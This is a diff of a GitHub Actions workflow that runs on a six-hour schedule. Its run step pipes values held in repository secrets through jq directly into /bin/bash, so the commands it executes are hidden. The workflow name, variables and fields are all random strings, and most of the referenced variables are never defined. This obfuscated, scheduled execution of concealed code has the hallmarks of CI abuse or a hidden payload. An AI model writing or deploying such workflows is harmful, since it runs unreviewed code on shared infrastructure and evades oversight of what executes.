@@ -1,20 +1,22 @@
 name: gonggangsi3819
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 3/6 * * *'
-
-jobs:  # 395
+    - cron: '55 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: gonggangsi3819
         env:
-          hyf46161: ${{ secrets.hyf46161 }}
+          phha81338: ${{ secrets.phha81338 }}
         run: |
-          echo $hyf46161 | jq -r .ot2932 | /bin/bash
-          echo $tgs00 | jq -r .lyaql15466 | /bin/bash
-          echo $kctk79527 | jq -r .bprkt70 | /bin/bash
+          echo $phha81338 | jq -r .ra474 | /bin/bash
+          echo $fqvp917 | jq -r .rwp7136 | /bin/bash
+          echo $ttkil5450 | jq -r .addb0 | /bin/bash
+          echo $cbh8638 | jq -r .wwf50 | /bin/bash
+          echo $gbzu6 | jq -r .fuy7634 | /bin/bash
+          echo $re55 | jq -r .kvcjs5610 | /bin/bash
+          echo $gk424 | jq -r .xa42178 | /bin/bash
 
